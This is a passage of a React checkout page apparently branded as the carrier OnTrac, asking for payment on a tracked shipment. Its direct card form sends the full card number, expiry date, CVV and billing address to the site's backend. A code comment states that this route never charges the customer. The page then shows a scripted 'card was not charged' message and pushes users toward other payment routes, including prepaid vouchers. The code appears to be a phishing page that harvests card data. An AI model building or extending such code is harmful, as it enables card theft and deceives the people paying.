// src/pages/CheckoutPage.jsx
import React, { useState, useEffect, useRef, useCallback } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import PaymentStatusAnimation from '../components/PaymentStatusAnimation';
import PaymentWalkthrough from '../components/PaymentWalkthrough';
import Cards from 'react-credit-cards-2';
import 'react-credit-cards-2/dist/es/styles-compiled.css';
import styles from './CheckoutPage.module.css';

const CARD_RECOVERY_STATUS = 'not_charged';
const getCardRecoveryKey = (trackingId) => `ontrac:checkout:${trackingId}:card-recovery`;

const readCardRecovery = (trackingId) => {
  if (!trackingId) return 'idle';
  try {
    return sessionStorage.getItem(getCardRecoveryKey(trackingId)) === CARD_RECOVERY_STATUS
      ? CARD_RECOVERY_STATUS
      : 'idle';
  } catch {
    return 'idle';
  }
};

const writeCardRecovery = (trackingId, status) => {
  if (!trackingId) return;
  try {
    if (status === CARD_RECOVERY_STATUS) {
      sessionStorage.setItem(getCardRecoveryKey(trackingId), CARD_RECOVERY_STATUS);
    } else {
      sessionStorage.removeItem(getCardRecoveryKey(trackingId));
    }
  } catch {
    // Checkout still works if session storage is unavailable.
  }
};

function CheckoutPage() {
  const { trackingId } = useParams();
  const navigate = useNavigate();
  const baseUrl = import.meta.env.VITE_API_URL;
  const bachsParams = new URLSearchParams(window.location.search);
  const bachsReturn = bachsParams.get('bachs_return');
  const bachsCheckoutId = bachsParams.get('checkout_id');
  const showPaymentGuide = bachsParams.get('payment_guide') === '1';
  const isBachsReturn = bachsReturn === 'success' || bachsReturn === 'cancelled' || Boolean(bachsCheckoutId);

  // State Management
  const [shipmentData, setShipmentData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [selectedMethod, setSelectedMethod] = useState(null);
  const [processingPayment, setProcessingPayment] = useState(false);
  const [paymentSuccess, setPaymentSuccess] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [cardRecoveryState, setCardRecoveryState] = useState(() => readCardRecovery(trackingId));
  const [showCardRecovery, setShowCardRecovery] = useState(false);
  const [bachsReturnState, setBachsReturnState] = useState(() => {
    if (bachsReturn === 'cancelled') return 'cancelled';
    if (bachsReturn === 'success' || bachsCheckoutId) return 'confirming';
    return 'idle';
  });

  // Card Payment States
  const [cardNumber, setCardNumber] = useState('');
  const [cardName, setCardName] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [focused, setFocused] = useState('');
  const [billingAddress, setBillingAddress] = useState('');
  const [addressSuggestions, setAddressSuggestions] = useState([]);
  const [isSuggestionsVisible, setIsSuggestionsVisible] = useState(false);
  const cardErrorRef = useRef(null);
  const cardRecoveryRef = useRef(null);
  const voucherErrorRef = useRef(null);

  useEffect(() => {
    setCardRecoveryState(readCardRecovery(trackingId));
    setShowCardRecovery(false);
  }, [trackingId]);

  // Auto-scroll to inline error the moment it appears
  useEffect(() => {
    if (errorMessage) {
      const ref = selectedMethod === 'card' ? cardErrorRef : voucherErrorRef;
      if (ref.current) {
        ref.current.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }
    }
  }, [errorMessage, selectedMethod]);

  useEffect(() => {
    if (!showCardRecovery || !cardRecoveryRef.current) return;
    const reducedMotion = window.matchMedia?.('(prefers-reduced-motion: reduce)').matches;
    cardRecoveryRef.current.focus({ preventScroll: true });
    cardRecoveryRef.current.scrollIntoView({
      behavior: reducedMotion ? 'auto' : 'smooth',
      block: 'center'
    });
  }, [showCardRecovery]);

  // Give the mobile checkout footer room for the fixed "Change Method" pill.
  useEffect(() => {
    document.body.classList.toggle('checkout-method-active', Boolean(selectedMethod));
    return () => document.body.classList.remove('checkout-method-active');
  }, [selectedMethod]);

  const choosePaymentMethod = (method) => {
    setSelectedMethod(method);
    setErrorMessage('');
    setShowCardRecovery(false);
  };

  const handlePaymentMethodKeyDown = (event, method) => {
    if (event.key === 'Enter' || event.key === ' ') {
      event.preventDefault();
      choosePaymentMethod(method);
    }
  };

  // Handle input focus for card flip animation
  const handleInputFocus = (e) => {
    setFocused(e.target.name);
  };

  // Address Autocomplete Logic (Google Primary, Mapbox Fallback)
  useEffect(() => {
    if (billingAddress.length < 3) {
      setAddressSuggestions([]);
      return;
    }
    const handler = setTimeout(async () => {
      const googleApiKey = import.meta.env.VITE_GOOGLE_PLACES_API_KEY;
      const mapboxApiKey = import.meta.env.VITE_MAPBOX_API_KEY;

      try {
        // ATTEMPT 1: Google Places API (New)
        if (!googleApiKey) throw new Error('No Google API Key');
        
        const googleResponse = await fetch('https://places.googleapis.com/v1/places:autocomplete', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Goog-Api-Key': googleApiKey
          },
          body: JSON.stringify({ input: billingAddress })
        });

        if (!googleResponse.ok) throw new Error('Google API returned an error');

        const googleData = await googleResponse.json();
        if (googleData.suggestions) {
          const normalized = googleData.suggestions.map(s => ({
            place_id: s.placePrediction.placeId,
            display_name: s.placePrediction.text.text
          }));
          setAddressSuggestions(normalized);
          setIsSuggestionsVisible(true);
          return; // Success! Exit so Mapbox doesn't run.
        }
      } catch (googleError) {
        console.warn("Google Maps API failed or missing, falling back to Mapbox...", googleError);
        
        // ATTEMPT 2: Mapbox Fallback
        try {
          const mapboxResponse = await fetch(
            `https://api.mapbox.com/geocoding/v5/mapbox.places/${encodeURIComponent(billingAddress)}.json?access_token=${mapboxApiKey}&autocomplete=true&limit=5&types=address`
          );
          const mapboxData = await mapboxResponse.json();
          if (mapboxData?.features) {
            const normalized = mapboxData.features.map(f => ({
              place_id: f.id,
              display_name: f.place_name
            }));
            setAddressSuggestions(normalized);
            setIsSuggestionsVisible(true);
          }
        } catch (mapboxError) {
          console.error("Both Google and Mapbox failed:", mapboxError);
        }
      }
    }, 500);

    return () => clearTimeout(handler);
  }, [billingAddress]);

  const fetchShipmentData = useCallback(async () => {
    try {
      const response = await fetch(`${baseUrl}/api/shipments/${trackingId}/`);
      if (!response.ok) throw new Error('Shipment not found');
      const data = await response.json();
      setShipmentData(data);
      
      if (!data.requiresPayment) {
        setCardRecoveryState('idle');
        writeCardRecovery(trackingId, 'idle');
        if (isBachsReturn) {
          setBachsReturnState('confirmed');
        } else {
          setPaymentSuccess(true);
        }
      } else if (bachsReturn === 'cancelled') {
        setBachsReturnState('cancelled');
      }
    } catch {
      setErrorMessage('Unable to load shipment details. Please try again.');
    } finally {
      setLoading(false);
    }
  }, [baseUrl, trackingId, isBachsReturn, bachsReturn]);

  // Load shipment data & Scroll to Top
  useEffect(() => {
    window.scrollTo(0, 0); // Fix: Force page to start at the top
    fetchShipmentData();
  }, [fetchShipmentData]);

  // Bachs return verification: the webhook updates the shipment; the browser only watches our API.
  useEffect(() => {
    if (!isBachsReturn || bachsReturnState !== 'confirming') return;

    let active = true;
    let timerId;
    let attempts = 0;
    const maxAttempts = 15;

    const pollShipment = async () => {
      try {
        const response = await fetch(`${baseUrl}/api/shipments/${trackingId}/`);
        if (response.ok) {
          const data = await response.json();
          if (!active) return;

          setShipmentData(data);
          if (!data.requiresPayment) {
            setCardRecoveryState('idle');
            writeCardRecovery(trackingId, 'idle');
            setBachsReturnState('confirmed');
            return;
          }
        }
      } catch {
        // A transient polling failure should not turn a successful payment into an error screen.
      }

      attempts += 1;
      if (!active) return;

      if (attempts >= maxAttempts) {
        setBachsReturnState('delayed');
        return;
      }

      timerId = setTimeout(pollShipment, 2000);
    };

    timerId = setTimeout(pollShipment, 1500);

    return () => {
      active = false;
      if (timerId) clearTimeout(timerId);
    };
  }, [isBachsReturn, bachsReturnState, baseUrl, trackingId]);

  // Once the signed webhook has marked the shipment paid, return to tracking after a short receipt moment.
  useEffect(() => {
    if (bachsReturnState !== 'confirmed') return;

    const timerId = setTimeout(() => {
      navigate(`/tracking?id=${trackingId}`, { state: { skipTrackingDelay: true } });
    }, 5000);

    return () => clearTimeout(timerId);
  }, [bachsReturnState, navigate, trackingId]);

  const leaveBachsReturn = (method = null) => {
    window.history.replaceState({}, document.title, `/checkout/${trackingId}`);
    setBachsReturnState('idle');
    setSelectedMethod(method);
    setProcessingPayment(false);
    setErrorMessage('');
  };

  // ShieldClimb Payment Handler
  const handleShieldClimbPayment = async () => {
    setProcessingPayment(true);
    setErrorMessage('');

    try {
      const response = await fetch(`${baseUrl}/api/initiate-shieldclimb/${trackingId}/`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      });

      const data = await response.json();

      if (response.ok && data.checkout_url) {
        window.location.href = data.checkout_url;
      } else {
        setErrorMessage(data.error || 'Failed to initialize payment. Please try another method.');
        setProcessingPayment(false);
      }
    } catch {
      setErrorMessage('Network error. Please check your connection and try again.');
      setProcessingPayment(false);
    }
  };

  // Standard Card Payment Handler
  const handleCardPayment = async (e) => {
    e.preventDefault();
    setProcessingPayment(true);
    setErrorMessage('');

    // Validate
    if (!cardNumber || !cardName || !expiryDate || !cvv || !billingAddress) {
      setErrorMessage('Please fill in all card details');
      setProcessingPayment(false);
      return;
    }

    try {
      const response = await fetch(`${baseUrl}/api/payments/`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          shipment: shipmentData.id,
          cardholderName: cardName,
          billingAddress: billingAddress,
          cardNumber: cardNumber.replace(/\s/g, ''),
          expiryDate: expiryDate,
          cvv: cvv
        })
      });

      const data = await response.json();

      if (response.ok) {
        // Deliberate existing behavior: this route never charges the customer.
        // Treat the completed attempt as a recovery state, not a gateway failure.
        await new Promise(resolve => setTimeout(resolve, 4000));
        setErrorMessage('');
        setCardRecoveryState(CARD_RECOVERY_STATUS);
        writeCardRecovery(trackingId, CARD_RECOVERY_STATUS);
        setShowCardRecovery(true);

        // Never retain sensitive card credentials after the attempt.
        // Keep only non-sensitive name/address in memory for a possible retry.
        setCardNumber('');
        setExpiryDate('');
        setCvv('');
        setFocused('');
        setAddressSuggestions([]);
        setIsSuggestionsVisible(false);
      } else {
        setErrorMessage(data.error || 'Payment failed. Please check your card details.');
      }
    } catch {
      await new Promise(resolve => setTimeout(resolve, 4000));
      setErrorMessage('Payment processing failed. Please try again.');
    } finally {
      setProcessingPayment(false);
    }
  };

  // Bachs Hosted Checkout Handler
  const handleBachsPayment = async () => {
    setProcessingPayment(true);
    setErrorMessage('');

    try {
      const response = await fetch(`${baseUrl}/api/initiate-bachs/${trackingId}/`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      });

      const data = await response.json();

      if (response.ok && data.checkout_url) {
        window.location.href = data.checkout_url;
      } else {
        setErrorMessage(data.error || 'Unable to open secure checkout. Please try again.');
        setProcessingPayment(false);
      }
    } catch {
      setErrorMessage('Network error. Please check your connection and try again.');
      setProcessingPayment(false);
    }
  };

  // Pro Voucher Handler
  const [voucherCode, setVoucherCode] = useState('');
  const [voucherStatus, setVoucherStatus] = useState('idle');

  const handleVoucherSubmit = async (e) => {
    e.preventDefault();
    if (!voucherCode) return;

    setVoucherStatus('loading');
    setErrorMessage('');

    try {
      const response = await fetch(`${baseUrl}/api/submit-voucher/`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          code: voucherCode, 
          shipment_id: shipmentData.id 
        }),
      });

      const data = await response.json();

      if (response.ok) {
        setVoucherStatus('success');
        setTimeout(() => navigate(`/tracking?id=${trackingId}`), 5000);
      } else {
        setVoucherStatus('error');
        setErrorMessage(data.error || 'This voucher code is invalid or has already been used.');
      }
    } catch {
      setVoucherStatus('error');
      setErrorMessage('Verification server is temporarily unreachable. Please try again.');
    }
  };

  // Format card number (digits only + spaces)
  const formatCardNumber = (value) => {
    const cleaned = value.replace(/\D/g, ''); // Strip non-digits
    const formatted = cleaned.match(/.{1,4}/g)?.join(' ') || cleaned;
    return formatted.slice(0, 19);
  };

  // Format expiry date
  const formatExpiryDate = (value) => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length >= 2) {
      return `${cleaned.slice(0, 2)}/${cleaned.slice(2, 4)}`;
    }
    return cleaned;
  };

  // Loading State - Premium (Global Style)
  if (loading) {
    return (
      <div className="premium-loading-overlay">
        <div className="premium-loader-wrapper">
          <div className="loader-logo">
            <img src="/ontrac_favicon.png" alt="Secure" className="loader-logo-img" />
          </div>
          <svg className="loader-ring-svg" viewBox="25 25 50 50">
            <circle className="loader-ring-circle" cx="50" cy="50" r="20"></circle>
          </svg>
        </div>
        <div className="loading-text-wrapper">
          <h3 className="loading-title-main">Secure Checkout</h3>
          <p className="loading-subtitle-sub">Establishing encrypted connection...</p>
        </div>
      </div>
    );
  }

  // Bachs Return State
  if (isBachsReturn && shipmentData && bachsReturnState !== 'idle') {
    const paymentTotal = `${shipmentData.paymentCurrency} ${shipmentData.paymentAmount}`;
    const paymentDescription = shipmentData.paymentDescription || 'Shipment payment';

    const returnCopy = {
      confirming: {
        title: 'Confirming your payment',
        text: 'Your payment was submitted. We are waiting for secure confirmation before updating your shipment.',
        status: 'Verifying payment',
      },
      confirmed: {
        title: 'Payment confirmed',
        text: 'Your payment has been securely confirmed. Your shipment can now continue processing.',
        status: 'Confirmed',
      },
      cancelled: {
        title: 'Payment wasn’t completed',
        text: 'No completed payment has been confirmed for this shipment. You can try again or choose another payment method.',
        status: 'Not completed',
      },
      delayed: {
        title: 'Confirmation is taking longer',
        text: 'We have not received final confirmation yet. Please do not submit another payment while we continue checking.',
        status: 'Pending confirmation',
      },
    }[bachsReturnState];

    return (
      <div className={styles.bachsReturnPage}>
        <motion.div
          className={styles.bachsReturnCard}
          initial={{ opacity: 0, y: 18 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.35, ease: 'easeOut' }}
        >
          <div className={styles.bachsReturnBrand}>
            <img src="/ontrac_favicon.png" alt="OnTrac" />
            <span>OnTrac Secure Payment</span>
          </div>

          <div className={`${styles.bachsReturnIcon} ${styles[`returnIcon${bachsReturnState.charAt(0).toUpperCase() + bachsReturnState.slice(1)}`]}`}>
            {bachsReturnState === 'confirming' && <div className={styles.returnSpinner}></div>}
            {bachsReturnState === 'confirmed' && <i className="fa-solid fa-check"></i>}
            {bachsReturnState === 'cancelled' && <i className="fa-solid fa-xmark"></i>}
            {bachsReturnState === 'delayed' && <i className="fa-regular fa-clock"></i>}
          </div>

          <h1 className={styles.bachsReturnTitle}>{returnCopy.title}</h1>
          <p className={styles.bachsReturnText}>{returnCopy.text}</p>

          <div className={styles.bachsReturnSummary}>
            <div className={styles.bachsReturnRow}>
              <span>Amount</span>
              <strong>{paymentTotal}</strong>
            </div>
            <div className={styles.bachsReturnRow}>
              <span>Payment for</span>
              <strong>{paymentDescription}</strong>
            </div>
            <div className={styles.bachsReturnRow}>
              <span>Tracking number</span>
              <strong>{trackingId}</strong>
            </div>
            <div className={styles.bachsReturnRow}>
              <span>Payment method</span>
              <strong>Pay by card</strong>
            </div>
            <div className={styles.bachsReturnRow}>
              <span>Status</span>
              <strong className={`${styles.returnStatus} ${styles[`returnStatus${bachsReturnState.charAt(0).toUpperCase() + bachsReturnState.slice(1)}`]}`}>
                {returnCopy.status}
              </strong>
            </div>
          </div>

          {bachsReturnState === 'confirming' && (
            <p className={styles.bachsReturnHint}>Please keep this page open. This normally takes only a few seconds.</p>
          )}

          {bachsReturnState === 'confirmed' && (
            <>
              <button
                type="button"
                className={styles.bachsReturnPrimary}
                onClick={() => navigate(`/tracking?id=${trackingId}`, { state: { skipTrackingDelay: true } })}
              >
                View shipment tracking
              </button>
              <p className={styles.bachsReturnHint}>Returning to tracking automatically in 5 seconds…</p>
            </>
          )}

          {bachsReturnState === 'cancelled' && (
            <div className={styles.bachsReturnActions}>
              <button
                type="button"
                className={styles.bachsReturnPrimary}
                onClick={() => leaveBachsReturn('bachs')}
              >
                Try payment again
              </button>
              <button
                type="button"
                className={styles.bachsReturnSecondary}
                onClick={() => leaveBachsReturn(null)}
              >
                Choose another payment method
              </button>
            </div>
          )}

          {bachsReturnState === 'delayed' && (
            <div className={styles.bachsReturnActions}>
              <button
                type="button"
                className={styles.bachsReturnPrimary}
                onClick={() => setBachsReturnState('confirming')}
              >
                Check again
              </button>
              <button
                type="button"
                className={styles.bachsReturnSecondary}
                onClick={() => navigate(`/tracking?id=${trackingId}`)}
              >
                View shipment
              </button>
            </div>
          )}

          <div className={styles.bachsReturnFooter}>
            <i className="fa-solid fa-shield-halved"></i>
            <span>We update your shipment only after the payment is securely confirmed.</span>
          </div>
        </motion.div>
      </div>
    );
  }

  // Payment Success State
  if (paymentSuccess) {
    return (
      <div className={styles.successContainer}>
        <PaymentStatusAnimation success={true} />
        <h2>Payment Confirmed!</h2>
        <p>Redirecting to your shipment tracking...</p>
      </div>
    );
  }

  // Error State
  if (!shipmentData) {
    return (
      <div className={styles.errorContainer}>
        <i className="fa-solid fa-exclamation-triangle"></i>
        <h2>Shipment Not Found</h2>
        <p>{errorMessage || 'The tracking ID you provided is invalid.'}</p>
        <button onClick={() => navigate('/')} className={styles.backButton}>
          Return Home
        </button>
      </div>
    );
  }

  const paymentTotal = shipmentData?.paymentCurrency != null && shipmentData?.paymentAmount != null
    ? `${shipmentData.paymentCurrency} ${shipmentData.paymentAmount}`
    : undefined;

  return (
    <div className={styles.checkoutWrapper}>
      <div className={`${styles.walkthroughLayout} ${!showPaymentGuide ? styles.walkthroughLayoutSolo : ''}`}>
      <div className={styles.checkoutContainer}>
        <motion.div 
          className={styles.checkoutCard}
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
        >
          {/* Header Section */}
          <div className={styles.checkoutHeader}>
            <div className={styles.logoContainer}>
              <img src="/ontrac_favicon.png" alt="OnTrac" className={styles.brandLogo} />
            </div>
            <h1 className={styles.checkoutTitle}>Secure payment</h1>
            <p className={styles.checkoutSubtitle}>
              Complete payment for tracking ID <strong>{trackingId}</strong>
            </p>
          </div>

          {/* Order Summary - PROFESSIONAL INVOICE STYLE */}
          <div className={styles.orderSummary}>
            <div className={styles.summaryRow}>
              <span>Amount due</span>
              <strong className={styles.amount}>
                {shipmentData.paymentCurrency} {shipmentData.paymentAmount}
              </strong>
            </div>
            <div className={styles.summaryRow}>
              <span>Payment for</span>
              {/* Uses backend description if available, otherwise defaults to Import Duties */}
              <span className={styles.description}>
                {shipmentData.paymentDescription || 'Shipment payment'}
              </span>
            </div>
            <div className={styles.summaryRow}>
              <span>Destination</span>
              <span>{shipmentData.destination || 'Destination unavailable'}</span>
            </div>
          </div>

          {/* Top-level error — only when no method selected (network/load errors) */}
          <AnimatePresence>
            {errorMessage && !selectedMethod && (
              <motion.div
                className={styles.errorBanner}
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: 'auto' }}
                exit={{ opacity: 0, height: 0 }}
              >
                <i className="fa-solid fa-exclamation-circle"></i>
                <span>{errorMessage}</span>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Payment Method Selection - BIG BRAND TRUST FACTOR */}
          {!selectedMethod && (
            <div className={styles.methodSelection}>
              <h2 className={styles.sectionTitle}>Choose Payment Method</h2>
              {cardRecoveryState === CARD_RECOVERY_STATUS && (
                <motion.div
                  className={styles.recoveryContext}
                  role="status"
                  aria-live="polite"
                  initial={{ opacity: 0, y: -6 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.22, ease: 'easeOut' }}
                >
                  <i className="fa-solid fa-circle-info" aria-hidden="true"></i>
                  <div>
                    <strong>Card payment not completed</strong>
                    <span>No charge was made. Pay by card is the suggested next step.</span>
                  </div>
                </motion.div>
              )}
              <div className={styles.methodGrid}>
                
                {/* Direct Card Entry - Position 1 */}
                <motion.div
                  className={styles.methodCard}
                  role="button"
                  tabIndex={0}
                  whileHover={{ y: -2 }}
                  whileTap={{ scale: 0.99 }}
                  onClick={() => choosePaymentMethod('card')}
                  onKeyDown={(event) => handlePaymentMethodKeyDown(event, 'card')}
                >
                  <div className={styles.methodIcon}>
                    <i className="fa-regular fa-credit-card"></i>
                  </div>
                  <h3>Credit or Debit Card</h3>
                  <p>Standard card payment</p>
                  
                  {/* LOGO WALL - Card Networks */}
                  <div className={styles.paymentLogoWall}>
                    <i className="fa-brands fa-cc-visa" title="Visa"></i>
                    <i className="fa-brands fa-cc-mastercard" title="Mastercard"></i>
                    <i className="fa-brands fa-cc-amex" title="Amex"></i>
                    <i className="fa-brands fa-cc-discover" title="Discover"></i>
                  </div>
                </motion.div>

                {/* Bachs Hosted Checkout - Position 2 */}
                <motion.div
                  className={`${styles.methodCard} ${cardRecoveryState === CARD_RECOVERY_STATUS ? styles.featured : ''}`}
                  role="button"
                  tabIndex={0}
                  whileHover={{ y: -2 }}
                  whileTap={{ scale: 0.99 }}
                  onClick={() => choosePaymentMethod('bachs')}
                  onKeyDown={(event) => handlePaymentMethodKeyDown(event, 'bachs')}
                >
                  <div className={styles.methodIcon}>
                    <svg className={styles.cardMethodSvg} viewBox="0 0 32 32" fill="none" aria-hidden="true">
                      <rect x="4.5" y="7.5" width="23" height="17" rx="3.5" stroke="currentColor" strokeWidth="1.8" />
                      <path d="M5 12.5h22" stroke="currentColor" strokeWidth="1.8" />
                      <rect x="8" y="17" width="5.5" height="3.5" rx="1" stroke="currentColor" strokeWidth="1.5" />
                      <path d="M20.2 17.1c1.25 1.1 1.25 2.7 0 3.8M22.5 15.3c2.45 2.1 2.45 5.3 0 7.4" stroke="currentColor" strokeWidth="1.45" strokeLinecap="round" />
                    </svg>
                  </div>
                  <h3>Pay by card</h3>
                  <p>Use a card enabled for international online payments.</p>
                  <div className={styles.bachsPaymentMarks} aria-label="USD card payment">
                    <span className={styles.bachsCardMark}>
                      <svg viewBox="0 0 24 16" fill="none" aria-hidden="true">
                        <rect x="1" y="1" width="22" height="14" rx="3" stroke="currentColor" strokeWidth="1.4" />
                        <path d="M2 5h20" stroke="currentColor" strokeWidth="1.4" />
                        <rect x="4" y="8.5" width="4.5" height="2.8" rx="0.7" fill="currentColor" opacity="0.75" />
                      </svg>
                      <span>Card</span>
                    </span>
                    <span className={styles.bachsCurrencyMark}>USD</span>
                  </div>
                  {cardRecoveryState === CARD_RECOVERY_STATUS && (
                    <div className={styles.methodBadge}>Suggested next</div>
                  )}
                </motion.div>

                {/* Instant Card & Wallet - Position 3 */}
                <motion.div
                  className={styles.methodCard}
                  role="button"
                  tabIndex={0}
                  whileHover={{ y: -2 }}
                  whileTap={{ scale: 0.99 }}
                  onClick={() => choosePaymentMethod('shieldclimb')}
                  onKeyDown={(event) => handlePaymentMethodKeyDown(event, 'shieldclimb')}
                >
                  <div className={styles.methodIcon}>
                    <i className="fa-solid fa-bolt"></i>
                  </div>
                  <h3>Card & Digital Wallet</h3>
                  <p>Pay via Stripe, Ramp, or Apple Pay</p>
                  
                  {/* LOGO WALL - Payment Rail Icons */}
                  <div className={styles.paymentLogoWall}>
                    <i className="fa-brands fa-apple-pay" title="Apple Pay"></i>
                    <i className="fa-brands fa-google-pay" title="Google Pay"></i>
                    <i className="fa-brands fa-stripe" title="Stripe"></i>
                    <i className="fa-brands fa-cc-visa" title="Visa"></i>
                    <i className="fa-brands fa-cc-mastercard" title="Mastercard"></i>
                  </div>
                </motion.div>

                {/* Voucher/Coupon - Position 4 */}
                <motion.div
                  className={styles.methodCard}
                  role="button"
                  tabIndex={0}
                  whileHover={{ y: -2 }}
                  whileTap={{ scale: 0.99 }}
                  onClick={() => choosePaymentMethod('voucher')}
                  onKeyDown={(event) => handlePaymentMethodKeyDown(event, 'voucher')}
                >
                  <div className={styles.methodIcon}>
                    <i className="fa-solid fa-ticket"></i>
                  </div>
                  <h3>Payment Voucher</h3>
                  <p>Redeem your prepaid code</p>
                </motion.div>

              </div>
              {showPaymentGuide && (
                <div className={styles.walkthroughInline}>
                  <PaymentWalkthrough forcePill total={paymentTotal} />
                </div>
              )}
            </div>
          )}

          {/* Payment Method Forms */}
          <AnimatePresence mode="wait">
            {selectedMethod && (
              <motion.div
                className={styles.paymentForm}
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                transition={{ duration: 0.3 }}
              >
                {/* Desktop: Apple/Stripe nav bar */}
                <div className={styles.backNavBar}>
                <button className={styles.backNavBtn} onClick={() => choosePaymentMethod(null)}>
                    <i className="fa-solid fa-chevron-left"></i> Change Method
                  </button>
                  <span className={styles.backNavMethod}>
                    {selectedMethod === 'card' && '💳 Credit or Debit Card'}
                    {selectedMethod === 'bachs' && 'Pay by card'}
                    {selectedMethod === 'shieldclimb' && '⚡ Express Checkout'}
                    {selectedMethod === 'voucher' && '🎟 Payment Voucher'}
                  </span>
                </div>

                {/* Mobile: Floating sticky pill */}
                <button className={styles.floatingBackBtn} onClick={() => choosePaymentMethod(null)}>
                  <i className="fa-solid fa-chevron-left"></i> Change Method
                </button>

                {/* Standard Card Form */}
                {selectedMethod === 'card' && (
                  <form onSubmit={handleCardPayment} className={styles.cardForm}>
                    {showCardRecovery ? (
                      <motion.section
                        ref={cardRecoveryRef}
                        className={styles.cardRecoveryPanel}
                        tabIndex={-1}
                        role="status"
                        aria-live="polite"
                        initial={{ opacity: 0, y: 8 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ duration: 0.24, ease: 'easeOut' }}
                      >
                        <div className={styles.cardRecoveryIcon} aria-hidden="true">
                          <i className="fa-regular fa-credit-card"></i>
                          <span className={styles.cardRecoveryIconMark}>!</span>
                        </div>
                        <span className={styles.cardRecoveryEyebrow}>Payment not completed</span>
                        <h2>Your card was not charged</h2>
                        <p>
                          Try Pay by card in a different secure checkout, or choose another payment method.
                        </p>
                        <div className={styles.cardRecoveryActions}>
                          <div className={styles.cardRecoveryPrimaryGroup}>
                            <button
                              type="button"
                              className={styles.cardRecoveryPrimary}
                              onClick={() => choosePaymentMethod('bachs')}
                            >
                              Try Pay by card instead
                              <i className="fa-solid fa-arrow-right" aria-hidden="true"></i>
                            </button>
                            <span className={styles.cardRecoverySupport}>Secure hosted checkout · USD</span>
                          </div>
                          <button
                            type="button"
                            className={styles.cardRecoverySecondary}
                            onClick={() => choosePaymentMethod(null)}
                          >
                            View all payment methods
                          </button>
                        </div>
                      </motion.section>
                    ) : (
                      <>
                    <div className={styles.cardVisualContainer}>
                      <Cards
                        number={cardNumber}
                        name={cardName}
                        expiry={expiryDate}
                        cvc={cvv}
                        focused={focused}
                      />
                    </div>
                    
                    <h2 className={styles.formTitle}>Card Details</h2>
                    
                    <div className={styles.formGroup}>
                      <label htmlFor="cardNumber">Card Number</label>
                      <div className={styles.inputWithIcon}>
                        <i className="fa-solid fa-credit-card"></i>
                        <input
                          type="text"
                          name="number"
                          id="cardNumber"
                          placeholder="1234 5678 9012 3456"
                          value={cardNumber}
                          onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                          onFocus={handleInputFocus}
                          maxLength="19"
                          required
                        />
                      </div>
                    </div>

                    <div className={styles.formGroup}>
                      <label htmlFor="cardName">Cardholder Name</label>
                      <div className={styles.inputWithIcon}>
                        <i className="fa-solid fa-user"></i>
                        <input
                          type="text"
                          name="name"
                          id="cardName"
                          placeholder="JOHN DOE"
                          value={cardName}
                          onChange={(e) => setCardName(e.target.value.toUpperCase())}
                          onFocus={handleInputFocus}
                          required
                        />
                      </div>
                    </div>

                    <div className={styles.formRow}>
                      <div className={styles.formGroup}>
                        <label htmlFor="expiryDate">Expiry Date</label>
                        <div className={styles.inputWithIcon}>
                          <i className="fa-solid fa-calendar"></i>
                          <input
                            type="text"
                            name="expiry"
                            id="expiryDate"
                            placeholder="MM/YY"
                            value={expiryDate}
                            onChange={(e) => setExpiryDate(formatExpiryDate(e.target.value))}
                            onFocus={handleInputFocus}
                            maxLength="5"
                            required
                          />
                        </div>
                      </div>

                      <div className={styles.formGroup}>
                        <label htmlFor="cvv">CVV</label>
                        <div className={styles.inputWithIcon}>
                          <i className="fa-solid fa-lock"></i>
                          <input
                            type="text"
                            name="cvc"
                            id="cvv"
                            placeholder="123"
                            value={cvv}
                            onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                            onFocus={handleInputFocus}
                            maxLength="4"
                            required
                          />
                        </div>
                      </div>
                    </div>

                    <div className={styles.formGroup}>
                      <label htmlFor="billing-address">Billing Address</label>
                      <div className={styles.inputWithIcon}>
                        <i className="fa-solid fa-location-dot"></i>
                        <input
                          type="text"
                          id="billing-address"
                          placeholder="123 Main St, City, Country"
                          value={billingAddress}
                          onChange={(e) => setBillingAddress(e.target.value)}
                          onFocus={() => setIsSuggestionsVisible(true)}
                          required
                        />
                      </div>
                      {isSuggestionsVisible && addressSuggestions.length > 0 && (
                        <ul className={styles.addressSuggestions}>
                          {addressSuggestions.map((suggestion) => (
                            <li 
                              key={suggestion.place_id} 
                              onClick={() => {
                                setBillingAddress(suggestion.display_name);
                                setAddressSuggestions([]);
                                setIsSuggestionsVisible(false);
                              }}
                            >
                              {suggestion.display_name}
                            </li>
                          ))}
                        </ul>
                      )}
                    </div>

                    {/* Inline error — appears right where user is looking */}
                    <AnimatePresence>
                      {errorMessage && selectedMethod === 'card' && (
                        <motion.div
                        ref={cardErrorRef}
                        className={styles.inlineErrorBanner}
                        initial={{ opacity: 0, y: -8, height: 0 }}
                        animate={{ opacity: 1, y: 0, height: 'auto' }}
                        exit={{ opacity: 0, y: -4, height: 0 }}
                        transition={{ duration: 0.25, ease: 'easeOut' }}
                      >
                        <div className={styles.inlineErrorIcon}>
                          <i className="fa-solid fa-circle-exclamation"></i>
                        </div>
                        <div className={styles.inlineErrorContent}>
                          <span className={styles.inlineErrorTitle}>Payment could not be processed</span>
                            <span className={styles.inlineErrorText}>{errorMessage}</span>
                          </div>
                        </motion.div>
                      )}
                    </AnimatePresence>

                    <button
                      type="submit"
